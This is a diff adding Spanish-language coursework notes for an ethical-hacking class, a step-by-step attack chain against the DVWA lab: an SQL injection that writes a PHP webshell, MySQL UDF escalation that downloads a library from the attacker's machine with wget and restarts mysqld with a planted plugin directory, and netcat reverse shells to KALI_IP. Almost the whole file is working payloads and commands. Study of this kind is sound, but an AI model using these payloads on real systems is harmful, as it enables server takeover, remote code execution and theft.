@@ -1,0 +1,136 @@
+=====================================================
+      ESCALADA A RCE - WEBSHELL + UDF + REVERSE SHELL
+      Autor: D1n0 (Alejandro Mamán) | INSO3A
+      Asignatura: Hacking Ético
+=====================================================
+=====================================================
+         PASO 1 - WEBSHELL VIA SQLi
+=====================================================
+
+Requisitos:
+- file_priv = Y
+- Directorio dentro del webroot escribible por MySQL
+
+OUTFILE vs DUMPFILE:
+  INTO OUTFILE  -> añade separadores y saltos de linea (para texto/PHP)
+  INTO DUMPFILE -> escribe byte a byte sin añadir nada (para binarios .so)
+
+Probar directorios hasta encontrar uno sin Errcode 13:
+  - /var/www/html/
+  - /opt/lampp/htdocs/
+  - /opt/lampp/htdocs/hackable/uploads/   <- suele funcionar en DVWA
+
+Escribir webshell:
+  1' UNION SELECT '<?php system($_GET["cmd"]); ?>',null INTO OUTFILE '/ruta/cmd.php'-- -
+
+Verificar que se escribio (null en surname = no existe o sin permisos):
+  1' UNION SELECT LOAD_FILE('/ruta/cmd.php'),null-- -
+
+Acceder desde el navegador:
+  http://TARGET/cmd.php?cmd=id
+
+[!] ERRORES COMUNES:
+  Errcode 13 = Permission denied → probar otro directorio
+  Errcode 2  = Ruta no existe → revisar la ruta
+  Warning mysql_numrows() → puede ser exito, verificar con LOAD_FILE
+
+
+=====================================================
+         PASO 2 - RCE VIA UDF (MySQL)
+=====================================================
+
+Requisitos:
+- Webshell funcionando (PASO 1)
+- MySQL y webshell corren como el mismo usuario (nobody)
+- Arquitectura del servidor conocida (@@version_compile_machine)
+
+--- Por que funciona el bypass ---
+MySQL corre como nobody. La webshell tambien corre como nobody.
+Por tanto podemos apagar MySQL y relanzarlo con parametros propios,
+incluyendo --plugin-dir apuntando a una carpeta donde nobody si tiene permisos.
+
+--- Flujo ---
+
+1. Buscar libreria UDF en Kali:
+   find / -name "lib_mysqludf_sys*" 2>/dev/null
+   Elegir segun arquitectura:
+     i686   → lib_mysqludf_sys_32.so
+     x86_64 → lib_mysqludf_sys_64.so
+   Ruta habitual: /usr/share/metasploit-framework/data/exploits/mysql/
+
+2. Servir la libreria desde Kali:
+   cd /usr/share/metasploit-framework/data/exploits/mysql/
+   python3 -m http.server 8080
+
+3. Descargar en la maquina victima via webshell:
+   ?cmd=wget http://[KALI_IP]:8080/lib_mysqludf_sys_32.so -O /tmp/lib_mysqludf_sys.so
+
+4. Verificar descarga:
+   ?cmd=ls -la /tmp/
+
+5. Crear directorio controlado por nobody:
+   ?cmd=mkdir -p /opt/lampp/htdocs/hackable/uploads/tmp/
+
+6. Copiar libreria al directorio controlado:
+   ?cmd=cp /tmp/lib_mysqludf_sys.so /opt/lampp/htdocs/hackable/uploads/tmp/
+
+7. Apagar MySQL:
+   ?cmd=/opt/lampp/bin/mysqladmin -u root shutdown
+
+8. Verificar que MySQL esta apagado:
+   ?cmd=ps aux | grep mysqld
+   (solo deben aparecer sh y grep)
+
+9. Borrar ficheros de bloqueo:
+   ?cmd=rm -f /opt/lampp/var/mysql/*.pid /opt/lampp/var/mysql/mysql.sock
+
+10. Relanzar MySQL con nuestro plugin-dir:
+    ?cmd=nohup /opt/lampp/sbin/mysqld --basedir=/opt/lampp --datadir=/opt/lampp/var/mysql --user=nobody --plugin-dir=/opt/lampp/htdocs/hackable/uploads/tmp/ --port=3306 2>/tmp/mysql_error.log &
+
+11. Verificar que MySQL correr con nuestro plugin-dir:
+    ?cmd=ps aux | grep mysqld
+    (debe aparecer el proceso con --plugin-dir=/opt/lampp/htdocs/hackable/uploads/tmp/)
+
+12. Registrar la funcion UDF:
+    ?cmd=/opt/lampp/bin/mysql -u root -e "CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';"
+
+13. Verificar RCE via MySQL:
+    ?cmd=/opt/lampp/bin/mysql -u root -e "SELECT sys_eval('id');"
+
+14. RCE desde el formulario web (cierre del circulo):
+    1' UNION SELECT 1,sys_eval('id')-- -
+
+[!] NOTAS:
+  - Si MySQL no arranca revisar: ?cmd=cat /tmp/mysql_error.log
+  - sys_eval devuelve output del comando
+  - sys_exec solo devuelve codigo de retorno (0 = exito)
+
+
+=====================================================
+         PASO 3 - REVERSE SHELL
+=====================================================
+
+Por que reverse shell y no solo RCE:
+  RCE via sys_eval → comandos sueltos uno a uno desde el formulario
+  Reverse shell    → terminal interactiva completa, independiente del formulario
+
+--- Desde Kali, poner netcat a escuchar ---
+
+nc -lvnp 4444
+
+--- Lanzar reverse shell desde el formulario DVWA via sys_eval ---
+
+1' UNION SELECT 1,sys_eval('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 4444 >/tmp/f')-- -
+
+--- O directamente desde la webshell ---
+
+?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 4444 >/tmp/f
+
+--- Alternativa si nc tiene flag -e ---
+
+?cmd=nc -e /bin/sh KALI_IP 4444
+
+[!] NOTA: La mayoria de versiones de nc en Linux (OpenBSD) no tienen -e.
+    Usar mkfifo que funciona siempre.
+
+=====================================================
